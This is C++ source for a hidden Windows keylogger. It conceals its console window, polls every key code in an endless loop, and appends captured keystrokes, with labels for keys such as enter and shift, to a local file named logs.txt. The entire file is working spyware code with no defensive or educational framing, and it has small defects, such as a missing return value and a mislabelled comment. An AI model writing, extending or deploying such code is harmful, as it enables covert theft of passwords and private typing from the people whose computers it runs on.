#include "pch.h"
#include <string>
#include <Windows.h>
#include <fstream>

using std::fstream;
using std::ofstream;

void WriteData(std::string Text)
{
	ofstream LogFile;
	LogFile.open("logs.txt", fstream::app);
	LogFile << Text;
	LogFile.close();
}
bool isKeyListed(int vKey)
{                            //Check For Special Keys
	switch (vKey)
	{
	case VK_RETURN:    //Space
		WriteData(" **enter** ");
		break;
	case VK_BACK:
		WriteData(" **backspace** ");
		break;
	case VK_SPACE:
		WriteData(" **spacebar** ");
		break;
	case VK_SHIFT:
		WriteData(" **shift** ");
		break;
	case VK_OEM_PERIOD:
		WriteData(" **point**");
		break;
	case VK_CAPITAL:
		WriteData(" **capital** ");
		break;
	case VK_LSHIFT:
		WriteData(" **leftShift** ");
		break;
	case VK_RSHIFT:
		WriteData(" **rightShift** ");
		break;
	case VK_TAB:
		WriteData(" **tab** ");
		break;
	default: return false;
	}
}

int main()
{
	setlocale(LC_ALL, "ru");
	ShowWindow(GetConsoleWindow(), SW_HIDE);//прячем окно консоли
	char key;
	while (1)
	{
		for (key = 0; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) & 0x0001)
			{
				if (isKeyListed(key) == 0)
				{
					ofstream LogFile;
					LogFile.open("logs.txt", fstream::app);
					LogFile << key << std::endl;
					LogFile.close();
				}
			}
		}
	}
	return 0;
}
